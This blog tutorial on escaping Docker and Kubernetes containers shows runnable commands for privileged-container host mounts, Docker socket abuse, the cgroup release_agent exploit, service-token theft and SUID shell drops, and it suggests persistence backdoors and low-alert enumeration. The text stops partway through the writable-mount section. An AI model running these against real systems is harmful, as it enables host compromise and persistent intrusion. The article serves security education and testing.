<!doctype html><html lang=en-US><head><meta http-equiv=X-Clacks-Overhead content="GNU Terry Pratchett"><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><link rel="shortcut icon" href=https://awwfensive.site/favicon.png><title>Container Escape: From Enumeration to Host Root | aniket/awwfensive</title><meta name=title content="Container Escape: From Enumeration to Host Root"><meta name=description content="



  Table Of Contents
  
  
    TL;DR: The One-Minute Version
    Understanding the Threat Model
      
        Why Containers Aren&rsquo;t Security Boundaries
        Common Misconceptions
      
    
    Full Enumeration Checklist
      
        Environment & Basic Indicators
        Files & Mounts
        Capabilities & Privilege Checks
        Docker Socket via cURL
        Kernel & Exploit Hunting
        Kubernetes-Specific Checks
      
    
    High-Probability Escape Vectors
      
        1. Privileged Containers
        2. Mounted Docker Socket
        3. Excessive Capabilities
        4. Writable Host Mounts
        5. Kubernetes Service Account Tokens & RBAC
        6. Kernel Exploits
      
    
    Lab Setup & Practice
      
        Quick Vulnerable Lab Setup
        Recommended Practice Resources
      
    
    Additional Resources
      
        Tools
        Further Reading
      
    
    Acknowledgments
  



Containers have become the backbone of modern infrastructure, powering everything from microservices to CI/CD pipelines. But here&rsquo;s the uncomfortable truth: containers are not virtual machines. They&rsquo;re processes with fancy namespaces and cgroups, sharing the same kernel as the host. This fundamental architecture creates a fascinating attack surface for security researchers and red teamers."><meta name=keywords content><meta property="og:url" content="https://awwfensive.site/container-escape-from-enumeration-to-host-root/"><meta property="og:site_name" content="aniket/awwfensive"><meta property="og:title" content="Container Escape: From Enumeration to Host Root"><meta property="og:description" content="Table Of Contents TL;DR: The One-Minute Version Understanding the Threat Model Why Containers Aren’t Security Boundaries Common Misconceptions Full Enumeration Checklist Environment & Basic Indicators Files & Mounts Capabilities & Privilege Checks Docker Socket via cURL Kernel & Exploit Hunting Kubernetes-Specific Checks High-Probability Escape Vectors 1. Privileged Containers 2. Mounted Docker Socket 3. Excessive Capabilities 4. Writable Host Mounts 5. Kubernetes Service Account Tokens & RBAC 6. Kernel Exploits Lab Setup & Practice Quick Vulnerable Lab Setup Recommended Practice Resources Additional Resources Tools Further Reading Acknowledgments Containers have become the backbone of modern infrastructure, powering everything from microservices to CI/CD pipelines. But here’s the uncomfortable truth: containers are not virtual machines. They’re processes with fancy namespaces and cgroups, sharing the same kernel as the host. This fundamental architecture creates a fascinating attack surface for security researchers and red teamers."><meta property="og:locale" content="en_US"><meta property="og:type" content="article"><meta property="article:section" content="blog"><meta property="article:published_time" content="2025-11-10T11:51:55+05:30"><meta property="article:modified_time" content="2025-11-10T11:51:55+05:30"><meta name=twitter:card content="summary"><meta name=twitter:title content="Container Escape: From Enumeration to Host Root"><meta name=twitter:description content="Table Of Contents TL;DR: The One-Minute Version Understanding the Threat Model Why Containers Aren’t Security Boundaries Common Misconceptions Full Enumeration Checklist Environment & Basic Indicators Files & Mounts Capabilities & Privilege Checks Docker Socket via cURL Kernel & Exploit Hunting Kubernetes-Specific Checks High-Probability Escape Vectors 1. Privileged Containers 2. Mounted Docker Socket 3. Excessive Capabilities 4. Writable Host Mounts 5. Kubernetes Service Account Tokens & RBAC 6. Kernel Exploits Lab Setup & Practice Quick Vulnerable Lab Setup Recommended Practice Resources Additional Resources Tools Further Reading Acknowledgments Containers have become the backbone of modern infrastructure, powering everything from microservices to CI/CD pipelines. But here’s the uncomfortable truth: containers are not virtual machines. They’re processes with fancy namespaces and cgroups, sharing the same kernel as the host. This fundamental architecture creates a fascinating attack surface for security researchers and red teamers."><meta itemprop=name content="Container Escape: From Enumeration to Host Root"><meta itemprop=description content="Table Of Contents TL;DR: The One-Minute Version Understanding the Threat Model Why Containers Aren’t Security Boundaries Common Misconceptions Full Enumeration Checklist Environment & Basic Indicators Files & Mounts Capabilities & Privilege Checks Docker Socket via cURL Kernel & Exploit Hunting Kubernetes-Specific Checks High-Probability Escape Vectors 1. Privileged Containers 2. Mounted Docker Socket 3. Excessive Capabilities 4. Writable Host Mounts 5. Kubernetes Service Account Tokens & RBAC 6. Kernel Exploits Lab Setup & Practice Quick Vulnerable Lab Setup Recommended Practice Resources Additional Resources Tools Further Reading Acknowledgments Containers have become the backbone of modern infrastructure, powering everything from microservices to CI/CD pipelines. But here’s the uncomfortable truth: containers are not virtual machines. They’re processes with fancy namespaces and cgroups, sharing the same kernel as the host. This fundamental architecture creates a fascinating attack surface for security researchers and red teamers."><meta itemprop=datePublished content="2025-11-10T11:51:55+05:30"><meta itemprop=dateModified content="2025-11-10T11:51:55+05:30"><meta itemprop=wordCount content="1913"><meta name=referrer content="no-referrer-when-downgrade"><style>:root{--width:720px;--font-main:Verdana, sans-serif;--font-secondary:Verdana, sans-serif;--font-scale:1em;--background-color:#fff;--heading-color:#222;--text-color:#444;--link-color:#3273dc;--visited-color:#8b6fcb;--blockquote-color:#222}@media(prefers-color-scheme:dark){:root{--background-color:#01242e;--heading-color:#eee;--text-color:#ddd;--link-color:#8cc2dd;--visited-color:#8b6fcb;--blockquote-color:#ccc}}body{font-family:var(--font-secondary);font-size:var(--font-scale);margin:auto;padding:20px;max-width:var(--width);text-align:left;background-color:var(--background-color);word-wrap:break-word;overflow-wrap:break-word;line-height:1.5;color:var(--text-color)}h1,h2,h3,h4,h5,h6{font-family:var(--font-main);color:var(--heading-color)}a{color:var(--link-color);cursor:pointer;text-decoration:none}a:hover{text-decoration:underline}nav a{margin-right:8px}strong,b{color:var(--heading-color)}button{margin:0;cursor:pointer}time{font-family:monospace;font-style:normal;font-size:15px}main{line-height:1.6}table{width:100%}hr{border:0;border-top:1px dashed}img{max-width:100%}code{font-family:monospace;padding:2px;border-radius:3px}blockquote{border-left:1px solid #999;color:var(--blockquote-color);padding-left:20px;font-style:italic}footer{padding:25px 0;text-align:center}.title:hover{text-decoration:none}.title h1{font-size:1.5em}.inline{width:auto!important}.highlight,.code{border-radius:3px;margin-block-start:1em;margin-block-end:1em;overflow-x:auto}ul.blog-posts{list-style-type:none;padding:unset}ul.blog-posts li{display:flex}ul.blog-posts li span{flex:0 0 130px}ul.blog-posts li a:visited{color:var(--visited-color)}</style><script src=https://cdn.jsdelivr.net/gh/adryd325/oneko.js@latest/oneko.js defer data-cat=/oneko.gif></script><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;500;700&display=swap" rel=stylesheet><style>:root{--bg:#ffffff;--text:#000000;--link:#ff6666}@media(prefers-color-scheme:light){:root{--bg:#ffffff;--text:#000000;--link:#ff6666}}::selection{background-color:#b3d9ff;color:#000}::-moz-selection{background-color:#b3d9ff;color:#000}body{background-color:#fff;color:#333;font-family:roboto mono,monospace;line-height:1.6;font-size:1em;max-width:720px;margin:0 auto;padding:20px}h1,h2,h3,h4,h5,h6,p,li,span,div{color:#000!important;font-family:roboto mono,monospace}strong,b,em,i,mark{color:#000!important}h1{font-size:2em;line-height:1.2}h2{font-size:1.5em;margin-top:2rem}h3{font-size:1.2em;margin-top:1.5rem}header h1,header h1 a,header a.title,body>header>h1,body>header>h1>a{color:#000!important;text-decoration:none!important;font-size:1.1em;font-family:roboto mono,monospace}header h1 a:hover{color:#000!important}article h1,article h2,main h1,main h2{color:#000!important}a{color:#000!important;text-decoration:none!important;border-bottom:2.5px solid #f66;padding-bottom:2px}a:hover{color:#000!important;border-bottom-color:#ff4d4d}header h1 a{text-decoration:none!important}header nav a{margin-right:1.5rem}time,.date{color:#5f7bdc!important}#theme-toggle{color:var(--link)!important;text-decoration:none!important;font-size:1.2em;cursor:pointer;transition:opacity .2s ease;display:inline-block;margin-left:1.5rem}#theme-toggle:hover{opacity:.7}header{border-bottom:1px solid #e0e0e0;padding-bottom:1rem;margin-bottom:2rem}footer{border-top:none;padding-top:1rem;margin-top:3rem}.blog-posts article{border-bottom:1px solid #e0e0e0;padding-bottom:1rem;margin-bottom:1rem}.blog-posts article:last-child{border-bottom:none}.highlight{margin:1.5rem 0}.highlight pre{background-color:#f5f5f5!important;color:#333!important;padding:1.25rem 1.5rem;border-radius:12px;overflow-x:auto;line-height:1.6;border:1px solid #e5e5e5}.highlight pre::-webkit-scrollbar{height:8px;border-radius:0 0 12px 12px}.highlight pre::-webkit-scrollbar-track{background-color:#f5f5f5;border-radius:0 0 12px 12px}.highlight pre::-webkit-scrollbar-thumb{background-color:#ccc;border-radius:4px}.highlight pre::-webkit-scrollbar-thumb:hover{background-color:#aaa}.highlight pre{scrollbar-width:thin;scrollbar-color:#ccc #f5f5f5}.highlight pre code,.highlight code{background:0 0!important;color:inherit!important;padding:0;font-size:.9em}code{font-family:roboto mono,courier new,monospace;font-size:.9em}p code,li code,h1 code,h2 code,h3 code{background-color:#f0f0f0!important;color:#c00!important;padding:2px 6px;border-radius:6px;font-size:.9em}.highlight .c,.highlight .cm,.highlight .c1,.highlight .cs,.highlight .sd{color:green!important;font-style:italic}.highlight .cp{color:green!important}.highlight .err,.highlight .gd,.highlight .gr,.highlight .gt,.highlight .ne{color:#e60000!important}.highlight .k,.highlight .kc,.highlight .kp,.highlight .kr{color:#af00db!important}.highlight .kd,.highlight .kn,.highlight .kt{color:#06c!important}.highlight .o,.highlight .ow,.highlight .w{color:#333!important}.highlight .ge{color:#333;font-style:italic}.highlight .gh,.highlight .gp,.highlight .gu{color:#06c!important;font-weight:700}.highlight .gi{color:green!important}.highlight .go{color:#666!important}.highlight .gs{color:#333;font-weight:700}.highlight .m,.highlight .mb,.highlight .mf,.highlight .mh,.highlight .mi,.highlight .mo,.highlight .il{color:#f60!important}.highlight .s,.highlight .sa,.highlight .sb,.highlight .sc,.highlight .dl,.highlight .s2,.highlight .sh,.highlight .si,.highlight .sx,.highlight .sr,.highlight .s1,.highlight .ss{color:#c41a16!important}.highlight .se{color:#af00db!important}.highlight .na,.highlight .nb,.highlight .ni,.highlight .nv,.highlight .bp,.highlight .vc,.highlight .vg,.highlight .vi,.highlight .vm{color:#06c!important}.highlight .nc,.highlight .nn,.highlight .nt{color:teal!important}.highlight .no{color:#f60!important}.highlight .nd,.highlight .nf,.highlight .fm{color:#06c!important}.highlight .nl{color:#06c!important}#TableOfContents{background-color:initial;border:none;padding:0;margin:2rem 0;border-radius:0}#TableOfContents{background-color:initial;border:none;padding:0;margin:2rem 0;border-radius:0}#TableOfContents ul{list-style:disc;padding-left:2rem;margin:.5rem 0}#TableOfContents>ul{padding-left:2rem}#TableOfContents ul ul{list-style:circle;padding-left:2rem}#TableOfContents li{margin:.5rem 0}#TableOfContents a{color:#000!important;text-decoration:none!important;border-bottom:2.5px solid #f66!important;padding-bottom:2px}#TableOfContents a:hover{color:#000!important;border-bottom-color:#ff4d4d!important}table{width:100%;border-collapse:collapse;margin:1.5rem 0;background-color:#fff}table th,table td{padding:.75rem;text-align:left;border:1px solid #d0d0d0}table th{background-color:#f9f9f9;font-weight:700;color:#000}table code{background-color:#f0f0f0;padding:2px 6px;border-radius:3px;color:#c00}figure{margin:1.5rem 0}figure img,.clickable-img{max-width:100%;width:100%;height:auto;display:block;cursor:pointer;transition:opacity .2s ease}figure img:hover,.clickable-img:hover{opacity:.8}.lightbox-modal{display:none;position:fixed;z-index:9999;left:0;top:0;width:100%;height:100%;background-color:rgba(0,0,0,.8);animation:fadeIn .3s}.lightbox-modal.active{display:flex;align-items:center;justify-content:center}.lightbox-content{position:relative;max-width:90%;max-height:90vh;animation:zoomIn .3s}.lightbox-content img{max-width:100%;max-height:85vh;width:auto;height:auto}.lightbox-close{position:absolute;top:-30px;right:0;color:#fff;font-size:28px;font-weight:700;cursor:pointer;user-select:none}.lightbox-close:hover{color:#ccc}@keyframes fadeIn{from{opacity:0}to{opacity:1}}@keyframes zoomIn{from{transform:scale(.8)}to{transform:scale(1)}}</style><script>document.addEventListener("DOMContentLoaded",function(){const e=document.createElement("div");e.className="lightbox-modal",e.innerHTML='<div class="lightbox-content"><span class="lightbox-close">&times;</span><img id="lightbox-img" src="" alt=""></div>',document.body.appendChild(e),document.querySelectorAll("figure img").forEach(t=>{t.style.cursor="pointer",t.addEventListener("click",function(){document.getElementById("lightbox-img").src=this.src,e.classList.add("active")})}),document.querySelector(".lightbox-close").addEventListener("click",function(){e.classList.remove("active")}),e.addEventListener("click",function(e){e.target===this&&this.classList.remove("active")}),document.addEventListener("keydown",function(t){t.key==="Escape"&&e.classList.remove("active")})})</script></head><body><header><a href=/ class=title><h2>aniket/awwfensive</h2></a><nav><a href=/>Home</a>
<a href=/blog/>Blog</a>
<a href=/projects/>Projects</a></nav></header><main><h1>Container Escape: From Enumeration to Host Root</h1><p><i><time datetime=2025-11-10>10 Nov, 2025</time></i></p><content><figure class=clickable-img><img src=/containersec/1.jpg alt=banner></figure><div class=toc><h3>Table Of Contents</h3><nav id=TableOfContents><ul><li><a href=#tldr-the-one-minute-version>TL;DR: The One-Minute Version</a></li><li><a href=#understanding-the-threat-model>Understanding the Threat Model</a><ul><li><a href=#why-containers-arent-security-boundaries>Why Containers Aren&rsquo;t Security Boundaries</a></li><li><a href=#common-misconceptions>Common Misconceptions</a></li></ul></li><li><a href=#full-enumeration-checklist>Full Enumeration Checklist</a><ul><li><a href=#environment--basic-indicators>Environment & Basic Indicators</a></li><li><a href=#files--mounts>Files & Mounts</a></li><li><a href=#capabilities--privilege-checks>Capabilities & Privilege Checks</a></li><li><a href=#docker-socket-via-curl>Docker Socket via cURL</a></li><li><a href=#kernel--exploit-hunting>Kernel & Exploit Hunting</a></li><li><a href=#kubernetes-specific-checks>Kubernetes-Specific Checks</a></li></ul></li><li><a href=#high-probability-escape-vectors>High-Probability Escape Vectors</a><ul><li><a href=#1-privileged-containers>1. Privileged Containers</a></li><li><a href=#2-mounted-docker-socket>2. Mounted Docker Socket</a></li><li><a href=#3-excessive-capabilities>3. Excessive Capabilities</a></li><li><a href=#4-writable-host-mounts>4. Writable Host Mounts</a></li><li><a href=#5-kubernetes-service-account-tokens--rbac>5. Kubernetes Service Account Tokens & RBAC</a></li><li><a href=#6-kernel-exploits>6. Kernel Exploits</a></li></ul></li><li><a href=#lab-setup--practice>Lab Setup & Practice</a><ul><li><a href=#quick-vulnerable-lab-setup>Quick Vulnerable Lab Setup</a></li><li><a href=#recommended-practice-resources>Recommended Practice Resources</a></li></ul></li><li><a href=#additional-resources>Additional Resources</a><ul><li><a href=#tools>Tools</a></li><li><a href=#further-reading>Further Reading</a></li></ul></li><li><a href=#acknowledgments>Acknowledgments</a></li></ul></nav></div><hr><p>Containers have become the backbone of modern infrastructure, powering everything from microservices to CI/CD pipelines. But here&rsquo;s the uncomfortable truth: containers are not virtual machines. They&rsquo;re processes with fancy namespaces and cgroups, sharing the same kernel as the host. This fundamental architecture creates a fascinating attack surface for security researchers and red teamers.</p><hr><h2 id=tldr-the-one-minute-version>TL;DR: The One-Minute Version</h2><p>If you only have sixty seconds, here&rsquo;s what you need to know about container escapes:</p><ul><li>Containers share the host kernel—they&rsquo;re <em>processes</em> with namespaces and cgroups, not VMs</li><li><strong>First step is always enumeration:</strong> Look for <code>/.dockerenv</code>, cgroups, capabilities, <code>/var/run/docker.sock</code>, writable host mounts, and Kubernetes service account tokens</li><li><strong>High-risk escape vectors:</strong> <code>--privileged</code> containers, mounted Docker socket, <code>CAP_SYS_ADMIN</code> capability, writable host paths, <code>hostPID</code>/<code>hostNetwork</code> in Kubernetes, and kernel CVEs</li></ul><blockquote><p><strong>Quick Win Checklist:</strong> If you find any of these, you&rsquo;re likely one command away from host access: privileged container, Docker socket mount, <code>CAP_SYS_ADMIN</code>, writable <code>/etc</code> or <code>/root</code> mount, elevated Kubernetes RBAC permissions.</p></blockquote><hr><h2 id=understanding-the-threat-model>Understanding the Threat Model</h2><h3 id=why-containers-arent-security-boundaries>Why Containers Aren&rsquo;t Security Boundaries</h3><p>The most important concept to understand is that containers are <strong>not</strong> security boundaries by design. They&rsquo;re isolation mechanisms built for resource management and application packaging, not for running untrusted code.</p><pre tabindex=0><code># Virtual Machine Model
Host Kernel → Hypervisor → Guest Kernel → Guest Process
(True isolation - separate kernels)

# Container Model  
Host Kernel → Container Runtime → Namespaces/Cgroups → Container Process
(Shared kernel - weaker isolation)
</code></pre><p>Because containers share the host kernel, any kernel vulnerability is automatically exploitable from inside containers. There&rsquo;s no additional security layer protecting the host from a compromised container—only namespace and capability restrictions, which are bypassable under many common misconfigurations.</p><h3 id=common-misconceptions>Common Misconceptions</h3><ul><li><strong>&ldquo;Containers are isolated&rdquo;</strong> — They have namespaced visibility, not true isolation</li><li><strong>&ldquo;Docker is secure by default&rdquo;</strong> — Default settings are better than they used to be, but misconfiguration is extremely common</li><li><strong>&ldquo;Kubernetes adds security&rdquo;</strong> — Kubernetes adds orchestration and some security features, but also expands the attack surface significantly</li><li><strong>&ldquo;Non-root containers are safe&rdquo;</strong> — Being non-root inside the container helps, but doesn&rsquo;t prevent escapes via capabilities or kernel exploits</li></ul><hr><h2 id=full-enumeration-checklist>Full Enumeration Checklist</h2><p>When you land inside a container, your first goal is reconnaissance. These commands help you understand your environment and identify potential escape vectors. All commands are designed to be quiet and avoid triggering obvious alerts.</p><h3 id=environment--basic-indicators>Environment & Basic Indicators</h3><p>Start with quick checks to confirm you&rsquo;re in a container and identify the container runtime:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Quick indicators</span>
</span></span><span class=line><span class=cl><span class=o>[</span> -f /.dockerenv <span class=o>]</span> <span class=o>&amp;&amp;</span> <span class=nb>echo</span> <span class=s2>&#34;dockerenv present&#34;</span>
</span></span><span class=line><span class=cl>cat /proc/1/cgroup
</span></span><span class=line><span class=cl>env <span class=p>|</span> grep -iE <span class=s1>&#39;kube|docker|container&#39;</span>
</span></span><span class=line><span class=cl>ls -la /
</span></span><span class=line><span class=cl>df -h
</span></span><span class=line><span class=cl>uname -a
</span></span></code></pre></div><blockquote><p><strong>What to look for:</strong> The <code>/.dockerenv</code> file is a dead giveaway for Docker containers. In <code>/proc/1/cgroup</code>, you&rsquo;ll see paths containing &ldquo;docker&rdquo; or &ldquo;kubepods&rdquo;. Environment variables often leak Kubernetes metadata.</p></blockquote><h3 id=files--mounts>Files & Mounts</h3><p>Check for the Docker socket (instant win), mounted filesystems, and writable directories that might be host mounts:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Check docker socket, mounts, writeable host dirs</span>
</span></span><span class=line><span class=cl>ls -la /var/run/docker.sock 2&gt;/dev/null <span class=o>||</span> <span class=nb>true</span>
</span></span><span class=line><span class=cl>mount <span class=p>|</span> sed -n <span class=s1>&#39;1,200p&#39;</span>
</span></span><span class=line><span class=cl>find / -xdev -type d -writable 2&gt;/dev/null <span class=p>|</span> head -n <span class=m>50</span>
</span></span><span class=line><span class=cl>grep -R --line-number <span class=s2>&#34;kube&#34;</span> /proc/mounts 2&gt;/dev/null <span class=o>||</span> <span class=nb>true</span>
</span></span></code></pre></div><blockquote><p><strong>Critical Finding:</strong> If <code>/var/run/docker.sock</code> exists and is accessible, you can control the Docker daemon and spawn privileged containers. This is a direct path to host root.</p></blockquote><h3 id=capabilities--privilege-checks>Capabilities & Privilege Checks</h3><p>Linux capabilities are the key to many container escapes. Check what capabilities your process has:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Requires util-linux or libcap-utils; fallback to /proc</span>
</span></span><span class=line><span class=cl>capsh --print 2&gt;/dev/null <span class=o>||</span> <span class=nb>true</span>
</span></span><span class=line><span class=cl>grep Cap /proc/self/status
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Privileged quick check</span>
</span></span><span class=line><span class=cl>ip link add dummy0 <span class=nb>type</span> dummy 2&gt;/dev/null <span class=o>&amp;&amp;</span> <span class=nb>echo</span> <span class=s2>&#34;likely privileged&#34;</span> <span class=o>||</span> <span class=nb>true</span>
</span></span></code></pre></div><p>The <code>ip link add</code> command is a clever trick—only privileged containers can create network interfaces. If this succeeds, you&rsquo;re almost certainly in a privileged container.</p><h3 id=docker-socket-via-curl>Docker Socket via cURL</h3><p>If the Docker socket is mounted, you can query it even without the Docker client:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># If curl is present</span>
</span></span><span class=line><span class=cl>curl --unix-socket /var/run/docker.sock http://localhost/containers/json
</span></span></code></pre></div><blockquote><p><strong>Pro Tip:</strong> The Docker API is RESTful and fully documented. You can create, start, stop, and execute commands in containers purely through HTTP requests to the socket.</p></blockquote><h3 id=kernel--exploit-hunting>Kernel & Exploit Hunting</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>uname -r
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Optional: list kernel config info</span>
</span></span><span class=line><span class=cl>zcat /proc/config.gz 2&gt;/dev/null <span class=o>||</span> <span class=nb>true</span>
</span></span></code></pre></div><p>The kernel version is critical for identifying known vulnerabilities. Tools like linux-exploit-suggester can help, but be cautious—kernel exploits can crash systems.</p><h3 id=kubernetes-specific-checks>Kubernetes-Specific Checks</h3><p>In Kubernetes environments, check for service account tokens and API access:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ls /var/run/secrets/kubernetes.io/serviceaccount/ 2&gt;/dev/null <span class=o>||</span> <span class=nb>true</span>
</span></span><span class=line><span class=cl>cat /var/run/secrets/kubernetes.io/serviceaccount/token 2&gt;/dev/null <span class=p>|</span> head -n <span class=m>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># API server base URL</span>
</span></span><span class=line><span class=cl><span class=nv>APISERVER</span><span class=o>=</span>https://kubernetes.default.svc
</span></span><span class=line><span class=cl><span class=nv>TOKEN</span><span class=o>=</span><span class=k>$(</span>cat /var/run/secrets/kubernetes.io/serviceaccount/token 2&gt;/dev/null<span class=k>)</span>
</span></span><span class=line><span class=cl>curl -k -H <span class=s2>&#34;Authorization: Bearer </span><span class=nv>$TOKEN</span><span class=s2>&#34;</span> <span class=nv>$APISERVER</span>/api/v1/namespaces 2&gt;/dev/null <span class=o>||</span> <span class=nb>true</span>
</span></span></code></pre></div><blockquote><p><strong>Kubernetes Reality:</strong> Most pods automatically mount service account tokens. If the service account has elevated RBAC permissions, you can interact with the Kubernetes API to create privileged pods, list secrets, or even gain cluster admin.</p></blockquote><hr><h2 id=high-probability-escape-vectors>High-Probability Escape Vectors</h2><p>Now that we&rsquo;ve covered enumeration, let&rsquo;s dive into the actual escape techniques. These are ordered by likelihood of success in real-world environments.</p><h3 id=1-privileged-containers>1. Privileged Containers</h3><p><strong>Why it works:</strong> The <code>--privileged</code> flag removes almost all namespace and cgroup enforcement, and grants access to all host devices including block devices.</p><p><strong>Detection:</strong> Try creating a network interface with <code>ip link add dummy0 type dummy</code>. Success strongly indicates privileged mode.</p><p><strong>Exploitation Pattern:</strong></p><ol><li>Identify you&rsquo;re privileged (network interface creation succeeds)</li><li>List available block devices with <code>fdisk -l</code></li><li>Mount host filesystem to local directory</li><li>Chroot into mounted filesystem for full host access</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>mkdir /mnt/host
</span></span><span class=line><span class=cl>mount /dev/sda1 /mnt/host       <span class=c1># or other block devices you find</span>
</span></span><span class=line><span class=cl>chroot /mnt/host /bin/bash
</span></span><span class=line><span class=cl>id
</span></span></code></pre></div><p><strong>What to do on the host:</strong> Once you&rsquo;ve chrooted into the host filesystem, you have full root access. Common persistence techniques include:</p><ul><li>Add SSH keys to <code>/root/.ssh/authorized_keys</code></li><li>Create new user accounts in <code>/etc/passwd</code> and <code>/etc/shadow</code></li><li>Add cron jobs or systemd services for persistence</li><li>Install backdoors or additional access mechanisms</li></ul><h3 id=2-mounted-docker-socket>2. Mounted Docker Socket</h3><p><strong>Why it works:</strong> When <code>/var/run/docker.sock</code> is mounted into a container, that container can control the entire Docker daemon. This is equivalent to root on the host.</p><p><strong>Detection:</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ls -la /var/run/docker.sock
</span></span><span class=line><span class=cl>curl --unix-socket /var/run/docker.sock http://localhost/containers/json
</span></span></code></pre></div><p><strong>Exploitation without Docker client:</strong> You can interact with Docker purely through HTTP requests to the Unix socket:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Create privileged container that mounts host root</span>
</span></span><span class=line><span class=cl>curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/create <span class=se>\
</span></span></span><span class=line><span class=cl>  -H <span class=s2>&#34;Content-Type: application/json&#34;</span> <span class=se>\
</span></span></span><span class=line><span class=cl>  -d <span class=s1>&#39;{&#34;Image&#34;:&#34;alpine&#34;,&#34;Cmd&#34;:[&#34;/bin/sh&#34;],&#34;HostConfig&#34;:{&#34;Binds&#34;:[&#34;/:/host&#34;],&#34;Privileged&#34;:true}}&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Note the container ID from response, then start and attach</span>
</span></span></code></pre></div><p><strong>If Docker client exists inside the container:</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>docker run -v /:/host --privileged -it --rm alpine chroot /host sh
</span></span></code></pre></div><blockquote><p><strong>Why this is dangerous:</strong> Mounting the Docker socket is surprisingly common in CI/CD pipelines, monitoring tools, and &ldquo;Docker-in-Docker&rdquo; setups. It&rsquo;s often done for convenience without understanding the security implications.</p></blockquote><h3 id=3-excessive-capabilities>3. Excessive Capabilities</h3><p><strong>Why it works:</strong> Linux capabilities allow fine-grained privilege delegation. Several capabilities effectively grant root access when misused.</p><p><strong>Detection:</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>capsh --print <span class=p>|</span> grep Cap
</span></span><span class=line><span class=cl>cat /proc/self/status <span class=p>|</span> grep Cap
</span></span></code></pre></div><h4 id=dangerous-capabilities>Dangerous Capabilities</h4><ul><li><strong>CAP_SYS_ADMIN:</strong> Allows mounting filesystems, loading kernel modules, and many other privileged operations. This is nearly equivalent to full root access.</li><li><strong>CAP_DAC_READ_SEARCH:</strong> Bypass file read permission checks. Can read any file on the system regardless of permissions.</li><li><strong>CAP_SYS_PTRACE:</strong> Allows ptracing any process, including those on the host. Can inject code into host processes.</li><li><strong>CAP_SYS_MODULE:</strong> Load kernel modules. Instant kernel-level code execution.</li></ul><p><strong>Exploitation example with CAP_SYS_ADMIN:</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Mount host filesystem</span>
</span></span><span class=line><span class=cl>mkdir /tmp/cgrp <span class=o>&amp;&amp;</span> mount -t cgroup -o rdma cgroup /tmp/cgrp
</span></span><span class=line><span class=cl>mkdir /tmp/cgrp/x
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=m>1</span> &gt; /tmp/cgrp/x/notify_on_release
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Find path on host</span>
</span></span><span class=line><span class=cl><span class=nv>host_path</span><span class=o>=</span><span class=k>$(</span>sed -n <span class=s1>&#39;s/.*\perdir=\([^,]*\).*/\1/p&#39;</span> /etc/mtab<span class=k>)</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;</span><span class=nv>$host_path</span><span class=s2>/exploit&#34;</span> &gt; /tmp/cgrp/release_agent
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Create exploit script</span>
</span></span><span class=line><span class=cl>cat &gt; /exploit <span class=s>&lt;&lt; EOF
</span></span></span><span class=line><span class=cl><span class=s>#!/bin/sh
</span></span></span><span class=line><span class=cl><span class=s>ps aux &gt; $host_path/output
</span></span></span><span class=line><span class=cl><span class=s>EOF</span>
</span></span><span class=line><span class=cl>chmod a+x /exploit
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Trigger execution on host</span>
</span></span><span class=line><span class=cl>sh -c <span class=s2>&#34;echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs&#34;</span>
</span></span></code></pre></div><h3 id=4-writable-host-mounts>4. Writable Host Mounts</h3><p><strong>Why it works:</strong> When host directories are bind-mounted into containers with write access, you can alter host files directly.</p><p><strong>High-value targets:</strong></p><ul><li><code>/etc</code> — Modify system configurations, add user accounts, alter service configurations</li><li><code>/root</code> — Add SSH keys, modify shell profiles for backdoors</li><li>Any directory used by init scripts — Add backdoors or SUID binaries that persist across reboots</li><li><code>/var/log</code> — Potentially write to log files that get processed by other services</li></ul><p><strong>SUID Binary Escalation:</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Drop SUID bash on host (lab environment only)</span>
</span></span><span class=line><span class=cl>cp /bin/bash /mnt/host/tmp/suidbash
</span></span><span class=line><span class=cl>chown root:root /mnt/host/tmp/suidbash
</span></span><span class=line><span class=cl>chmod <span class=m>4755</span> /mnt/host/tmp/suidbash
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># On host, run:</span>
</span></span><span class=line><span class=cl><span class=c1># /tmp/suidbash -p  =&gt; instant root shell</span>
